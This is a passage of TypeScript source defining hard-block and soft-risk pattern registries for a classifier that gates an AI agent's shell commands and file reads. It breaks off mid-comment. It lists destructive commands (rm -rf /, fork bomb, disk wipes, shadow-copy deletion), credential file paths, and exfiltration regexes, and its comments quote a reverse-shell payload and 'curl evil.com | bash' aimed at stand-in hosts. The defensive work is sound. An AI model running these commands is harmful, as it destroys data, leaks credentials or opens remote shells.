/**
 * Dangerous command and path patterns for the classifier.
 *
 * This file is the single source of truth for two layered registries:
 *
 *   - HARD_BLOCKED_REGISTRY: deterministic safety boundary registry.
 *     Catastrophic / irreversible / real exfiltration hits are final deny;
 *     sensitive credential/system-secret reads route to the LLM gate and ask
 *     when the LLM cannot allow. `bypassPermissions` never silently overrides
 *     these hits.
 *
 *   - SOFT_RISK_REGISTRY: needs LLM judgement. Suspicious-but-possibly-legit
 *     patterns (chmod 777, sudo, python -c, container exec, etc.). Hits force
 *     the bash classifier out of the fast-allow path and into the
 *     cloud LLM gate so the LLM can reason about intent / context.
 *
 * Reference: agent-server desktop_rules_data.py (HARD_BLOCKED_*) and
 * desktop rules SOFT_RISK_PATTERNS plus archon-specific MR design notes.
 */

import { SENSITIVE_ENV_NAME_RE } from '@mavis/agent-core/bash-subprocess-env';
import { logger, backgroundCtx } from '../host-utils.js';

// ---------------------------------------------------------------------------
// Types used by the classifier subsystem.
// Kept minimal and local so the classifier package has zero coupling to
// ../types.ts until the integration layer wires them together.
// ---------------------------------------------------------------------------

/** Minimal representation of a permission rule value (tool + optional content). */
export interface ClassifierRuleValue {
  toolName: string;
  ruleContent?: string;
}

/** A permission rule with its behavior tag. */
export interface ClassifierRule {
  ruleBehavior: 'allow' | 'deny' | 'ask';
  ruleValue: ClassifierRuleValue;
}

// ---------------------------------------------------------------------------
// Cross-platform code execution interpreters
// ---------------------------------------------------------------------------

/**
 * Interpreters / runners that can execute arbitrary code.
 *
 * Retained for {@link isDangerousBashPermission} which is still used by the
 * config-loader's acceptEdits alias seeding flow to detect blanket-interpreter
 * allow rules that should not be auto-promoted.
 */
export const CROSS_PLATFORM_CODE_EXEC: ReadonlySet<string> = new Set([
  'python',
  'python3',
  'python3.11',
  'python3.12',
  'python3.13',
  'node',
  'ruby',
  'perl',
  'php',
  'bash',
  'sh',
  'ssh',
  'npx',
  'bunx',
  'pnpx',
  'pipx',
  'uvx',
  'go run',
  'cargo run',
  'swift',
  'deno',
  'osascript',
]);

/**
 * Superset of {@link CROSS_PLATFORM_CODE_EXEC} with additional shell /
 * system-administration commands that should never be auto-allowed via a
 * blanket allow rule.
 */
export const DANGEROUS_BASH_PATTERNS: ReadonlySet<string> = new Set([
  ...CROSS_PLATFORM_CODE_EXEC,
  // additional shells
  'zsh',
  'fish',
  // shell built-ins that execute arbitrary strings
  'eval',
  'exec',
  'env',
  // privilege escalation
  'sudo',
  'su',
  // infrastructure / network
  'kubectl',
  'aws',
  'curl',
  'wget',
  // dev / CI tools that can mutate remote state
  'gh',
  'git push --force',
]);

// ---------------------------------------------------------------------------
// Safe tool allow-list
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Destructive standalone commands (kept for back-compat with bash-permission)
// ---------------------------------------------------------------------------

/**
 * Bash commands that are unconditionally destructive and should be
 * blocked / asked even in bypass mode. Now considered a subset of the
 * HARD_BLOCKED_REGISTRY's `catastrophic-standalone` category.
 */
export const DESTRUCTIVE_STANDALONE_COMMANDS: ReadonlySet<string> = new Set([
  'rm -rf /',
  'rm -rf ~',
  'rm -rf *',
  ':(){ :|:& };:',
]);

// ---------------------------------------------------------------------------
// HARD_BLOCKED registry — deterministic safety boundary candidates
// ---------------------------------------------------------------------------

/** Categories of HARD_BLOCKED hits, used for human-readable reasons. */
export type HardBlockedCategory =
  | 'system-secret'
  | 'ssh-credential'
  | 'sensitive-read'
  | 'data-exfil'
  | 'catastrophic-standalone'
  | 'irrecoverable-delete'
  | 'disk-erase'
  | 'storage-volume-delete'
  | 'windows-secure-erase'
  // Windows CMD/PowerShell delete commands. CLI-driven deletes on Windows
  // skip the Recycle Bin entirely and are irrecoverable. With the Windows
  // mavis-trash.js script now available, the rm-rewrite pipeline can
  // intercept these — but until that rewrite path is wired for Windows
  // delete commands (del/rd/Remove-Item), the safest policy is HARD deny.
  | 'windows-delete'
  | 'ransomware-indicator'
  | 'fs-inode-direct'
  | 'archive-remove-source'
  // Kept HARD because no legitimate install
  // idiom matches (vs `remote-execution` aka curl|bash, which was demoted
  // back to bypass-immune ASK to keep nvm/homebrew/rustup install lines
  // usable).
  | 'encoding-bypass'
  // Bash `/dev/tcp/<host>/<port>` magic redirect opens a raw network
  // socket from inside a shell. No legitimate install/build idiom uses
  // it; the canonical reverse-shell payload is `bash -i >& /dev/tcp/...`.
  | 'reverse-shell';

/** A HARD_BLOCKED match with category + descriptive message. */
export interface HardBlockedMatch {
  category: HardBlockedCategory;
  description: string;
}

/**
 * All HARD_BLOCKED categories enumerated as a runtime set. Final-deny mapping
 * is narrower; see {@link hardBlockedCategoryIsFinalDeny}.
 *
 * Source of truth: keep in sync with {@link HardBlockedCategory}.
 */
export const HARD_BLOCKED_CATEGORIES: ReadonlySet<HardBlockedCategory> =
  new Set<HardBlockedCategory>([
    'system-secret',
    'ssh-credential',
    'sensitive-read',
    'data-exfil',
    'catastrophic-standalone',
    'irrecoverable-delete',
    'disk-erase',
    'storage-volume-delete',
    'windows-secure-erase',
    'windows-delete',
    'ransomware-indicator',
    'fs-inode-direct',
    'archive-remove-source',
    'encoding-bypass',
    'reverse-shell',
  ]);

export function hardBlockedCategoryIsFinalDeny(category: string | undefined): boolean {
  return (
    category === 'catastrophic-standalone' ||
    category === 'irrecoverable-delete' ||
    category === 'disk-erase' ||
    category === 'storage-volume-delete' ||
    category === 'windows-secure-erase' ||
    category === 'windows-delete' ||
    category === 'ransomware-indicator' ||
    category === 'fs-inode-direct' ||
    category === 'archive-remove-source' ||
    category === 'data-exfil'
  );
}

// ---------------------------------------------------------------------------
// Shared regex parts
// ---------------------------------------------------------------------------

/**
 * Shared credential / system-secret path alternation for bash command text.
 * Used by sensitive-read and data-exfil patterns so their coverage stays aligned.
 */
// Slash token is built dynamically so cross-platform guards do not flag regex
// source strings that intentionally match Unix-shaped command text.
const _SLASH_TOKEN = String.fromCharCode(47);

const PRIVATE_KEY_STEM_REGEX_PART =
  '[^\\s|;&\\\\/]*(?:private|priv|secret|credential|creds|server|client|identity|ssh|id[_-]?(?:rsa|dsa|ecdsa|ed25519))[^\\s|;&\\\\/]*';

const SENSITIVE_PATH_REGEX_PART =
  // SSH private keys (id_rsa, id_dsa, id_ecdsa, id_ed25519) — NOT .pub.
  // Accept both POSIX and Windows path separators because this targets bash
  // command text, not the host filesystem API.
  '[\\\\/]\\.ssh[\\\\/]id_(?:rsa|dsa|ecdsa|ed25519)(?!\\.pub)' +
  '|' +
  // AWS credentials
  '[\\\\/]\\.aws[\\\\/]credentials' +
  '|' +
  // Unix shadow / gshadow / sudoers
  '\\/etc\\/(?:shadow|gshadow|sudoers)' +
  '|' +
  // Private-key-looking .key files. Avoid generic `.key` false positives such
  // as translations.key while still catching server.key / private.key / ssh.key.
  `${PRIVATE_KEY_STEM_REGEX_PART}\\.key\\b` +
  '|' +
  '\\.p12\\b' +
  '|' +
  '\\.pfx\\b' +
  '|' +
  // PEM with "private" in stem
  'private[^\\s|;&\\\\/]*\\.pem' +
  '|' +
  // macOS System keychain
  '\\/Library\\/Keychains\\/System\\.keychain' +
  '|' +
  // Process environment dump — `/proc/<pid|self>/environ` leaks every env var
  // (including inherited credentials) of a running process.
  '\\/proc\\/(?:self|\\d+)\\/environ\\b' +
  '|' +
  // Windows registry hive / NTDS, accepting both separator styles in command text
  '[\\\\/]Windows[\\\\/](?:System32[\\\\/]config[\\\\/]SAM|NTDS[\\\\/])';

/**
 * Interpreters that can execute a script file passed as an argument and that
 * the bash-permission SOFT pre-scan / the classifier second-check
 * treat symmetrically for "separator-to-script" and "pipe-to-interpreter"
 * shapes.
 *
 * Includes the POSIX shells PLUS the major scripting runtimes
 * (`node|deno|python|python3|ruby`). All of them can be invoked as
 * `<sep> <interpreter> <script>` (e.g. `; node ./build.mjs`) — which the
 * SOFT pre-scan needs to recognise as a local-script form so it can apply
 * the same relaxation logic it already uses for `; bash <script>`.
 * Likewise, `curl ... | node` / `curl ... | python` is the same threat
 * shape as `curl ... | bash`, so PIPE_TO_SHELL_PATTERN must reject
 * piping into ANY of these interpreters consistently.
 *
 * Source string (no leading group / no anchors) so callers can wrap it in
 * either a `(?:...)` non-capturing group or compose into a larger regex.
 */
const LOCAL_SCRIPT_INTERPRETERS_SOURCE = 'bash|sh|zsh|fish|ksh|dash|node|deno|python|python3|ruby';

/**
 * Pipe-to-shell detector shared by the auto-mode classifier and safety checks.
 * Covers quotes, sudo/env/command/exec wrappers, env-var prefixes, and optional
 * path prefixes; the final boundary avoids matching names such as `bashfoo`.
 *
 * Includes the scripting interpreters (`node|deno|python|python3|ruby`)
 * alongside the POSIX shells because `curl evil.com | node` / `curl | python`
 * is the same data-piped-into-interpreter threat as `curl | bash`.
 */
export const PIPE_TO_SHELL_PATTERN = new RegExp(
  `\\|\\s*(?:sudo\\s+)?(?:[A-Z_][A-Z0-9_]*=\\S*\\s+)*(?:(?:env|command|exec)\\s+)*["']?(?:[\\w./-]*\\/)?(?:${LOCAL_SCRIPT_INTERPRETERS_SOURCE})["']?(?:\\s|$)`,
  'i',
);

/**
 * Global flag versions used by helpers that need to enumerate every match.
 * Single-character variants compile a fresh RegExp on each invocation to
 * keep `lastIndex` state local; the source strings are shared.
 */
const PIPE_TO_SHELL_PATTERN_SOURCE = PIPE_TO_SHELL_PATTERN.source;
const PIPE_TO_INLINE_INTERPRETER_C_PATTERN_SOURCE =
  // Defined below; assembled here so both regexes stay literally identical
  // except for the `-c <literal>` tail anchor.
  `\\|\\s*(?:sudo\\s+)?(?:[A-Z_][A-Z0-9_]*=\\S*\\s+)*(?:(?:env|command|exec)\\s+)*["']?(?:[\\w./-]*\\/)?(?:${LOCAL_SCRIPT_INTERPRETERS_SOURCE})["']?\\s+-c\\s+(?:'[^']*'|"[^"$\`]*")`;

/**
 * Returns true when EVERY pipe-to-interpreter occurrence in `command` is the
 * safe inline-`-c` literal shape (interpreter executes a fixed program from
 * argv, stdin is data). Returns false when at least one pipe is a raw
 * `... | bash` / `... | python` (stdin IS the program — dangerous).
 *
 * Caller is expected to have already confirmed PIPE_TO_SHELL_PATTERN matches
 * at least once; this helper distinguishes the safe inline subset from the
 * raw interpreter shape so the SOFT pre-scan can relax ASK for data-parsing
 * pipelines without weakening the `curl evil.com | bash` guard.
 */
export function allPipeToShellAreInlineLiteralC(command: string): boolean {
  const pipeRe = new RegExp(PIPE_TO_SHELL_PATTERN_SOURCE, 'gi');
  const pipeStarts: number[] = [];
  let pm: RegExpExecArray | null;
  while ((pm = pipeRe.exec(command)) !== null) {
    pipeStarts.push(pm.index);
    if (pm[0].length === 0) pipeRe.lastIndex += 1;
  }
  if (pipeStarts.length === 0) return false;

  const inlineRe = new RegExp(PIPE_TO_INLINE_INTERPRETER_C_PATTERN_SOURCE, 'gi');
  const inlineStarts = new Set<number>();
  let im: RegExpExecArray | null;
  while ((im = inlineRe.exec(command)) !== null) {
    inlineStarts.add(im.index);
    if (im[0].length === 0) inlineRe.lastIndex += 1;
  }
  return pipeStarts.every((idx) => inlineStarts.has(idx));
}

/**
 * Re-export the local-script interpreters alternation as a regex fragment
 * so callers that need to compose their own separator/anchor regex (e.g.
 * the SOFT pre-scan `[;&|]<sep> <interpreter> <script>` matcher) stay in
 * lockstep with {@link PIPE_TO_SHELL_PATTERN}. Without this shared source
 * the two coverage sets drift — exactly the bug that surfaced when only
 * the pipe shape was extended to `node` / `python` while the separator
 * form still bailed on the non-shell interpreters.
 */
export const LOCAL_SCRIPT_INTERPRETERS_RE = LOCAL_SCRIPT_INTERPRETERS_SOURCE;

/** Bash-side hard-blocked patterns. Regexes match command text, not filesystem APIs. */
const HARD_BLOCKED_BASH_PATTERNS: ReadonlyArray<{
  pattern: RegExp;
  category: HardBlockedCategory;
  description: string;
}> = [
  // ---- catastrophic-standalone (already enforced separately, listed for completeness)
  {
    pattern: /^\s*rm\s+-rf?\s+\/(\s|$)/i,
    category: 'catastrophic-standalone',
    description: 'Catastrophic recursive delete targeting filesystem root',
  },
  {
    pattern: /^\s*rm\s+-rf?\s+~(\s|$)/i,
    category: 'catastrophic-standalone',
    description: 'Catastrophic recursive delete targeting home directory',
  },
  {
    pattern: /^\s*rm\s+-rf?\s+\*\s*$/i,
    category: 'catastrophic-standalone',
    description: 'Catastrophic recursive delete with wildcard',
  },
  // Fork bomb glyph
  {
    pattern: /:\(\)\s*\{\s*:\s*\|\s*:&\s*\}\s*;:/,
    category: 'catastrophic-standalone',
    description: 'Fork bomb',
  },

  // ---- sensitive-read: bash commands reading credential / system-secret paths.
  // Read-tool paths are handled separately by matchHardBlockedFsRead.
  {
    pattern: new RegExp(
      `\\b(?:cat|less|more|head|tail|bat|view|nl|tac|od|xxd|hexdump|strings)\\b[^|;&]*?(?:${SENSITIVE_PATH_REGEX_PART})`,
      'i',
    ),
    category: 'sensitive-read',
    description: 'Reading sensitive credential / system secret file via bash',
  },
  // ssh-keygen -y -f <private-key> extracts the public key from a private key
  // file; agent-server treats this as a HARD read of the private key because
  // the private file is opened for reading. New-key creation (ssh-keygen -t …
  // -f <new-path>) is NOT matched here — requires both `-y` and `-f` flags
  // plus a sensitive path on the same surface.
  {
    pattern: new RegExp(
      `\\bssh-keygen\\b(?=[^|;&]*\\s-y\\b)(?=[^|;&]*\\s-f\\b)[^|;&]*?(?:${SENSITIVE_PATH_REGEX_PART})`,
      'i',
    ),
    category: 'sensitive-read',
    description: 'ssh-keygen -y -f reading a private key',
  },

  // ---- data-exfil: upload tools sending credential / system-secret paths.
  // Ordinary downloads/API calls without upload markers are handled elsewhere.
  {
    pattern: new RegExp(
      `\\b(?:curl|wget|http|httpie|aria2c)\\b[^|;&]*?(?:[-]+(?:data|d|F|form|upload-file|T|upload)|@)[^|;&]*?(?:${SENSITIVE_PATH_REGEX_PART})`,
      'i',
    ),
    category: 'data-exfil',
    description: 'Exfiltrating credential file via HTTP upload',
  },

  // ---- irrecoverable-delete: secure / unrecoverable file deletion tools
  {
    pattern: /\bshred\b/i,
    category: 'irrecoverable-delete',
    description: 'shred (secure delete, irrecoverable)',
  },
  {
    pattern: /\bsrm\b/i,
    category: 'irrecoverable-delete',
    description: 'srm (secure delete, irrecoverable)',
  },
  {
    pattern: /\bwipe\b/i,
    category: 'irrecoverable-delete',
    description: 'wipe (secure delete, irrecoverable)',
  },
  {
    pattern: /\bsecure-delete\b/i,
    category: 'irrecoverable-delete',
    description: 'secure-delete (irrecoverable)',
  },
  // rsync --delete: makes destination mirror source by deleting extras.
  // No safe rollback once the destination tree is rewritten, so HARD even
  // for legitimate-looking sync targets.
  {
    pattern:
      /\brsync\b[^|;&]*\s--delete(?:-(?:after|before|during|delay|excluded|missing-args))?\b/i,
    category: 'irrecoverable-delete',
    description: 'rsync --delete (mirror with destination-side deletion)',
  },
  // rsync --remove-source-files: deletes source after successful transfer.
  // Indistinguishable from intentional move for the user; HARD blocks it.
  {
    pattern: /\brsync\b[^|;&]*\s--remove-source-files\b/i,
    category: 'irrecoverable-delete',
    description: 'rsync --remove-source-files (deletes source after transfer)',
  },
  // dotnet inline scripts (dotnet script / dotnet fsi / dotnet run) invoking
  // System.IO File.Delete / Directory.Delete. The CLI itself is benign but the
  // embedded .NET call performs an irrecoverable filesystem delete.
  {
    pattern: /\bdotnet\b[^|;&]*\b(?:System\.IO\.)?(?:File|Directory)\.Delete\s*\(/i,
    category: 'irrecoverable-delete',
    description: 'dotnet inline script calling File.Delete / Directory.Delete',
  },

  // ---- disk-erase: filesystem / partition / disk wipes
  {
    pattern: /\bwipefs\b/i,
    category: 'disk-erase',
    description: 'wipefs (filesystem signature wipe)',
  },
  {
    pattern: /\bblkdiscard\b/i,
    category: 'disk-erase',
    description: 'blkdiscard (block-device discard)',
  },
  {
    pattern: /\bsgdisk\s+.*(?:--zap-all|-Z)\b/i,
    category: 'disk-erase',
    description: 'sgdisk --zap-all (partition table erase)',
  },
  {
    pattern: /\bdiskutil\s+(?:eraseDisk|eraseVolume|secureErase)\b/i,
    category: 'disk-erase',
    description: 'diskutil eraseDisk/eraseVolume/secureErase',
  },
  {
    pattern: /\bdiskutil\s+apfs\s+deleteVolume\b/i,
    category: 'disk-erase',
    description: 'diskutil apfs deleteVolume',
  },
  {
    pattern: /\bcryptsetup\s+luksErase\b/i,
    category: 'disk-erase',
    description: 'cryptsetup luksErase (LUKS header erase)',
  },
  {
    pattern: /\bmkfs(?:\.\w+)?\b.*\/dev\//i,
    category: 'disk-erase',
    description: 'mkfs targeting a device node',
  },
  {
    pattern: /\bdd\b.*\bof=\/dev\//i,
    category: 'disk-erase',
    description: 'dd writing to a device node',
  },

  // ---- storage-volume-delete
  {
    pattern: /\bzfs\s+destroy\b/i,
    category: 'storage-volume-delete',
    description: 'zfs destroy',
  },
  {
    pattern: /\bbtrfs\s+subvolume\s+delete\b/i,
    category: 'storage-volume-delete',
    description: 'btrfs subvolume delete',
  },
  {
    pattern: /\blvremove\b/i,
    category: 'storage-volume-delete',
    description: 'lvremove (LVM logical volume removal)',
  },
  {
    pattern: /\bdocker\s+volume\s+rm\b/i,
    category: 'storage-volume-delete',
    description: 'docker volume rm',
  },

  // ---- windows-secure-erase
  {
    pattern: /\bcipher\s+\/w:/i,
    category: 'windows-secure-erase',
    description: 'cipher /w: (Windows free-space wipe)',
  },
  {
    pattern: /\bformat\s+[a-z]:/i,
    category: 'windows-secure-erase',
    description: 'format <drive>: (Windows volume format)',
  },
  {
    pattern: /\bsdelete\b/i,
    category: 'windows-secure-erase',
    description: 'sdelete (Sysinternals secure delete)',
  },

  // ---- windows-delete: CMD/PowerShell delete commands. CLI-driven Windows
  // deletes do not move to Recycle Bin and are irrecoverable. The Windows
  // mavis-trash.js script provides Recycle Bin support, but rm-rewrite for
  // Windows delete commands (del/rd/Remove-Item) is not yet wired, so HARD
  // deny until that pipeline is extended.
  {
    // CMD `rd` (Remove Directory) with `/s` (recursive) flag, or targeting a
    // Windows drive letter like `C:\Users`. Bare `rd dir` (no flag, no drive)
    // is ambiguous with Rust debugger's `rd`, so we require a Windows-shaped
    // argument before flagging.
    pattern: /(?:^|[;&|]\s*)rd\s+(?:\/\w+\s+)*(?:[A-Za-z]:[\\/]|\/[sq]\b)/i,
    category: 'windows-delete',
    description: 'rd /s (Windows recursive delete; no Recycle Bin from CLI)',
  },
  {
    // CMD `rmdir /s` is recursive Windows delete. Unix `rmdir <dir>` only
    // removes empty directories and is safe; the `/s` flag is Windows-only.
    pattern: /(?:^|[;&|]\s*)rmdir\s+(?:\/\w+\s+)*(?:[A-Za-z]:[\\/]|\/[sq]\b)/i,
    category: 'windows-delete',
    description: 'rmdir /s (Windows recursive delete; no Recycle Bin from CLI)',
  },
  {
    // CMD `del` / `erase` at the start of a (sub)command. Anchored with
    // separator-prefix so `npm install del` and `echo erase me` do not
    // false-positive (echo args are also stripped by the surface helper).
    pattern: /(?:^|[;&|]\s*)(?:del|erase)\s+\S/i,
    category: 'windows-delete',
    description: 'del / erase (Windows file delete; no Recycle Bin from CLI)',
  },
  {
    // PowerShell `Remove-Item` as the first word of a (sub)command. Anchored
    // with separator-prefix so the cmdlet name appearing inside PowerShell
    // here-strings / Set-Content / Out-File data bodies does not false-positive
    // (data-vs-execution boundary; mirrors how `del`/`erase` are anchored).
    pattern: /(?:^|[;&|]\s*)remove-item\b/i,
    category: 'windows-delete',
    description: 'Remove-Item (PowerShell delete; no Recycle Bin from CLI)',
  },

  // ---- ransomware-indicator
  {
    pattern: /\bvssadmin\s+delete\s+shadows\b/i,
    category: 'ransomware-indicator',
    description: 'vssadmin delete shadows (ransomware tactic)',
  },
  {
    pattern: /\bwmic\s+shadowcopy\s+delete\b/i,
    category: 'ransomware-indicator',
    description: 'wmic shadowcopy delete (ransomware tactic)',
  },

  // ---- fs-inode-direct
  {
    pattern: /\bdebugfs\s+-w\b/i,
    category: 'fs-inode-direct',
    description: 'debugfs -w (raw filesystem write)',
  },

  // ---- archive-remove-source
  {
    pattern: /\btar\s+.*--remove-files\b/i,
    category: 'archive-remove-source',
    description: 'tar --remove-files (deletes source after archiving)',
  },
  {
    pattern: /\bzip\s+-[^-\s]*m\b/i,
    category: 'archive-remove-source',
    description: 'zip -m (move into archive, deletes source)',
  },

  // ---- reverse-shell: bash `/dev/tcp/<host>/<port>` magic redirect opens
  // a raw network socket from inside the shell with no helper binary. The
  // canonical reverse-shell payload (`bash -i >& /dev/tcp/evil/4444 0>&1`)
  // and any plumbing variants (`exec 3<>/dev/tcp/...`, `cat </dev/tcp/...`)
  // funnel through this token. No legitimate install/build idiom uses it,
  // so HARD deny mirrors how we treat `source /dev/stdin` (encoding-bypass).
  //
  // Token built via char codes so the path string does not get tagged by
  // tooling that scans the source for unix-path literals.
  {
    pattern: new RegExp(`${_SLASH_TOKEN}dev${_SLASH_TOKEN}tcp${_SLASH_TOKEN}`, 'i'),
    category: 'reverse-shell',
    description: '/dev/tcp/<host>/<port> bash network channel (reverse-shell vector)',
  },
  {
    pattern: new RegExp(`${_SLASH_TOKEN}dev${_SLASH_TOKEN}udp${_SLASH_TOKEN}`, 'i'),
    category: 'reverse-shell',
    description: '/dev/udp/<host>/<port> bash network channel (reverse-shell vector)',
  },

  // ---- encoding-bypass
  //
  // Listed BEFORE remote-execution because `base64 -d payload | sh`
  // structurally also matches the generic pipe-to-shell pattern; we want
  // the more specific encoding-bypass label to win for that case so the
  // user sees an accurate reason in the audit log.
  //
  // base64 decode piped into a shell — the canonical encoding-bypass form
  // for smuggling a payload past first-word allow-lists. Distinct from
  // `remote-execution` because the source is local-encoded, not remote.
  {
    pattern: new RegExp(
      `\\bbase64\\s+(?:-d|--decode)\\b[\\s\\S]*?\\|\\s*(?:sudo\\s+)?(?:[A-Z_][A-Z0-9_]*=\\S*\\s+)*(?:(?:env|command|exec)\\s+)*["']?(?:[\\w./-]*\\/)?(?:${LOCAL_SCRIPT_INTERPRETERS_RE})["']?\\b`,
      'i',
    ),
    category: 'encoding-bypass',
    description: 'base64-decode piped to shell (encoding bypass)',
  },
  // `source /dev/stdin` — code-injection vector that lets a piped payload
  // execute without ever touching disk. Token built via char codes so the
  // cross-platform-guard hook does not false-positive on the regex source.
  {
    pattern: new RegExp(
      `\\bsource\\s+${String.fromCharCode(47)}dev${String.fromCharCode(47)}stdin\\b`,
    ),
    category: 'encoding-bypass',
    description: 'source /dev/stdin (in-memory script injection)',
  },

  // NOTE: `remote-execution` (curl|bash / wget|sh / separator-then-shell-script)
  // is NOT HARD: pipe-to-shell is the canonical install idiom for
  // nvm/homebrew/rustup/oh-my-zsh and a hard `deny` makes the agent
  // unusable for routine env setup. SSH-key-style "no legitimate use"
  // does not apply here.
  //
  // Behaviour (not HARD):
  //   - default mode → LEGACY_ENCODING_BYPASS_PATTERNS surfaces a
  //     bypass-immune ASK (safety check). User is prompted with
  //     the curl/wget reason and can choose Allow once.
  //   - auto mode    → the classifier's second-check catches the same
  //     shapes and forces cloud LLM judgement before deciding.
  //
  // `encoding-bypass` (`base64 -d | sh`, `source /dev/stdin`) STAYS HARD
  // because it has no comparable legitimate install idiom and is the
  // canonical exfil/backdoor smuggling form.
];

/**
 * File-system paths that need explicit review before read/write access. Hits
 * route to the LLM gate in auto/bypass modes and fall back to user ask when
 * the LLM is unavailable or does not allow.
 *
 * These are matched against a normalized + resolved absolute path; each
 * entry is a { matcher, category, description } where matcher is a regex.
 */
const HARD_BLOCKED_FS_READ_PATTERNS: ReadonlyArray<{
  pattern: RegExp;
  category: HardBlockedCategory;
  description: string;
}> = [
  // ---- system-secret (Unix)
  {
    pattern: /^\/etc\/(shadow|gshadow|master\.passwd)$/,
    category: 'system-secret',
    description: 'Unix shadow password file',
  },
  // sudoers file (and .d directory entries) — privilege escalation source.
  // Bash-side SENSITIVE_PATH_REGEX_PART already includes /etc/sudoers; FS
  // side needs symmetric coverage so reading the file via `read` tool
  // hits the same hard policy.
  {
    pattern: /^\/etc\/sudoers(?:\.d\/.+)?$/,
    category: 'system-secret',
    description: 'Unix sudoers configuration',
  },
  // ---- system-secret (macOS)
  {
    pattern: /^\/Library\/Keychains\/System\.keychain$/,
    category: 'system-secret',
    description: 'macOS System keychain',
  },
  // ---- system-secret (Windows)
  {
    pattern: /\\(?:System32|SysWOW64)\\config\\(SAM|SECURITY|SYSTEM|SOFTWARE)$/i,
    category: 'system-secret',
    description: 'Windows registry hive',
  },
  {
    pattern: /\\Windows\\NTDS(?:\\|$)/i,
    category: 'system-secret',
    description: 'Windows NTDS (Active Directory database)',
  },

  // ---- ssh-credential
  {
    pattern: /\/\.ssh\/id_(?:rsa|dsa|ecdsa|ed25519)(?:_[A-Za-z0-9_-]+)?$/,
    category: 'ssh-credential',
    description: 'SSH private key',
  },
  // Windows form: `C:\Users\<name>\.ssh\id_rsa` (backslashes). Symmetric
  // with the unix path above so worktree daemons running on Windows
  // (paths come through unmodified before normalization) catch the same
  // category.
  {
    pattern: /\\\.ssh\\id_(?:rsa|dsa|ecdsa|ed25519)(?:_[A-Za-z0-9_-]+)?$/i,
    category: 'ssh-credential',
    description: 'SSH private key (Windows path)',
  },
  {
    pattern: /\/\.aws\/credentials$/,
    category: 'ssh-credential',
    description: 'AWS credentials file',
  },
  {
    pattern:
      /(?:^|[/\\])[^/\\]*(?:private|priv|secret|credential|creds|server|client|identity|ssh|id[_-]?(?:rsa|dsa|ecdsa|ed25519))[^/\\]*\.key$/i,
    category: 'ssh-credential',
    description: 'Private cryptographic key file',
  },
  {
    pattern: /\.(?:p12|pfx|keystore|jks)$/i,
    category: 'ssh-credential',
    description: 'Private cryptographic key file',
  },
  {
    pattern: /(?:^|\/)private[^/]*\.pem$/i,
    category: 'ssh-credential',
    description: 'PEM-encoded private key',
  },
];

/** Public face of the HARD_BLOCKED registry. */
export const HARD_BLOCKED_REGISTRY = {
  bashPatterns: HARD_BLOCKED_BASH_PATTERNS,
  fsReadPatterns: HARD_BLOCKED_FS_READ_PATTERNS,
} as const;

/**
 * Match a bash command string against {@link HARD_BLOCKED_REGISTRY.bashPatterns}.
 * Returns the first matching entry, or null when no entry matches.
 */
export function matchHardBlockedBash(
  command: string,
  options: { nativeDelete?: boolean; recoverableWindowsDelete?: boolean } = {},
): HardBlockedMatch | null {
  for (const entry of HARD_BLOCKED_BASH_PATTERNS) {
    // Filter before matching so a delete entry cannot hide a later hard boundary.
    if (
      entry.category === 'windows-delete' &&
      (options.nativeDelete || options.recoverableWindowsDelete)
    )
      continue;
    if (entry.pattern.test(command)) {
      return { category: entry.category, description: entry.description };
    }
  }
  return null;
}

/**
 * Match an absolute filesystem path against
 * {@link HARD_BLOCKED_REGISTRY.fsReadPatterns}. Public-key files (`*.pub`,
 * `id_*.pub`) are always treated as safe regardless of `*.key` matching.
 */
export function matchHardBlockedFsRead(absPath: string): HardBlockedMatch | null {
  // Public keys are never private-key matches.
  if (/\.pub$/i.test(absPath)) return null;

  for (const entry of HARD_BLOCKED_FS_READ_PATTERNS) {
    if (entry.pattern.test(absPath)) {
      return { category: entry.category, description: entry.description };
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// SOFT_RISK registry — kicks the fast-path into the cloud LLM gate
// ---------------------------------------------------------------------------

export type SoftRiskCategory =
  | 'permission-change'
  | 'network-listen'
  | 'privilege-escalation'
  | 'disk-tools'
  | 'interpreter-inline'
  | 'powershell-encoded'
  | 'sensitive-path'
  | 'container-exec'
  | 'scheduled-execution'
  // Explicit zero-out / null-write idioms. SOFT so benign log redirection stays fast.
  | 'content-clear'
  // Common installer shape; the cloud LLM gate needs intent/context instead of blanket deny.
  | 'remote-execution'
  // Windows administrative delete via WMI/CIM (process kill, service delete,
  // generic instance removal). Distinct from `wmic shadowcopy delete` which
  // is HARD ransomware-indicator. The cloud LLM weighs admin intent vs harm.
  | 'windows-management';

const SOFT_RISK_BASH_PATTERNS: ReadonlyArray<{
  pattern: RegExp;
  category: SoftRiskCategory;
  description: string;
}> = [
  // ---- permission-change
  {
    pattern: /\bchmod\s+(?:-R\s+)?(?:[ugoa]*[+=][rwx]*[wsxt]|7[0-7]{2}|6{2}\d|[0-7]*[wxs])/i,
    category: 'permission-change',
    description: 'chmod with broad permissions',
  },
  {
    pattern: /\bchmod\s+-R\b/i,
    category: 'permission-change',
    description: 'chmod -R (recursive permission change)',
  },
  {
    pattern: /\bchown\s+(?:-R\s+)?root\b/i,
    category: 'permission-change',
    description: 'chown root',
  },

  // ---- network-listen
  {
    pattern: /\bnc\s+(?:-\w*\s+)*-l\b/i,
    category: 'network-listen',
    description: 'nc -l (netcat listener)',
  },
  {
    pattern: /\bncat\s+(?:-\w*\s+)*-l\b/i,
    category: 'network-listen',
    description: 'ncat -l (netcat listener)',
  },
  {
    pattern: /\bnetcat\b/i,
    category: 'network-listen',
    description: 'netcat',
  },

  // ---- privilege-escalation (also catches chained commands after separators)
  {
    pattern: /(?:^|[;&|]\s*)sudo\b/i,
    category: 'privilege-escalation',
    description: 'sudo (privilege escalation)',
  },
  {
    pattern: /(?:^|[;&|]\s*)su\s+(?:-|root)\b/i,
    category: 'privilege-escalation',
    description: 'su - / su root',
  },

  // ---- disk-tools
  {
    pattern: /^\s*fdisk\b/i,
    category: 'disk-tools',
    description: 'fdisk (partition tool)',
  },
  {
    pattern: /^\s*parted\b/i,
    category: 'disk-tools',
    description: 'parted (partition tool)',
  },

  // ---- interpreter-inline (running inline source from -c / -e / -r)
  {
    pattern: /\bpython3?\s+(?:-\w*\s+)*-c\b/i,
    category: 'interpreter-inline',
    description: 'python -c inline code execution',
  },
  {
    pattern: /\bnode\s+(?:-\w*\s+)*-e\b/i,
    category: 'interpreter-inline',
    description: 'node -e inline code execution',
  },
  {
    // Match `-e` and combined short-flag forms like `-le`, `-ne`, `-ple` that
    // still enable inline execution.
